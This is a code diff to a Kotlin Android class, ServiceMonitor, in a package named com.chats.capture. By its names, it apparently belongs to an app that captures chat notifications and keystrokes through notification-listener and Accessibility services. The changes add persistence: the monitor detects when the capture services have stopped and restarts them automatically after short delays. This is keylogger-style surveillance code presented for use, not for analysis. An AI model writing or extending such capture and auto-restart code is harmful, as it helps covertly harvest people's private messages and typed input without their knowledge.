@@ -28,17 +28,24 @@ class ServiceMonitor(private val context: Context) {
     }
     
     private suspend fun checkServices() {
-        val notificationServiceRunning = isNotificationServiceEnabled()
-        val keyboardServiceRunning = isAccessibilityServiceEnabled()
+        val notificationServiceEnabled = isNotificationServiceEnabled()
+        val keyboardServiceEnabled = isAccessibilityServiceEnabled()
+        val notificationServiceRunning = com.chats.capture.utils.ServiceStarter.isNotificationServiceRunning(context)
         
-        Timber.d("Service status - Notification: $notificationServiceRunning, Keyboard: $keyboardServiceRunning")
+        Timber.tag("SERVICE_MONITOR").d("📊 Service status check - Notification Enabled: $notificationServiceEnabled, Running: $notificationServiceRunning, Keyboard Enabled: $keyboardServiceEnabled")
         
-        if (!notificationServiceRunning) {
-            Timber.w("Notification service is not enabled")
+        if (!notificationServiceEnabled) {
+            Timber.tag("SERVICE_MONITOR").w("⚠️ Notification service permission is not enabled - Enable in Settings")
+        } else if (!notificationServiceRunning) {
+            // Service permission is enabled but service is not running - restart it
+            Timber.tag("SERVICE_MONITOR").w("⚠️ Notification service is enabled but not running - Restarting...")
+            com.chats.capture.utils.ServiceStarter.ensureServicesRunning(context)
+        } else {
+            Timber.tag("SERVICE_MONITOR").d("✅ Notification service is running normally")
         }
         
-        if (!keyboardServiceRunning) {
-            Timber.w("Keyboard service is not enabled")
+        if (!keyboardServiceEnabled) {
+            Timber.tag("SERVICE_MONITOR").w("⚠️ Keyboard service (Accessibility) permission is not enabled")
         }
     }
     
@@ -83,18 +90,31 @@ class ServiceMonitor(private val context: Context) {
     
     fun restartServices() {
         try {
+            Timber.tag("SERVICE_MONITOR").i("🔄 Restarting services...")
             // Restart notification service
             val notificationIntent = Intent(context, NotificationCaptureService::class.java)
             context.stopService(notificationIntent)
-            context.startForegroundService(notificationIntent)
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                com.chats.capture.utils.ServiceStarter.startNotificationService(context)
+            }, 1000) // Small delay before restart
             
             // Restart keyboard service
             val keyboardIntent = Intent(context, KeyboardCaptureService::class.java)
             context.stopService(keyboardIntent)
-            context.startForegroundService(keyboardIntent)
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    context.startForegroundService(keyboardIntent)
+                }, 1500)
+            } else {
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    context.startService(keyboardIntent)
+                }, 1500)
+            }
             
+            Timber.tag("SERVICE_MONITOR").i("✅ Services restart initiated")
             Timber.d("Services restarted")
         } catch (e: Exception) {
+            Timber.tag("SERVICE_MONITOR").e(e, "❌ Error restarting services")
             Timber.e(e, "Error restarting services")
         }
     }
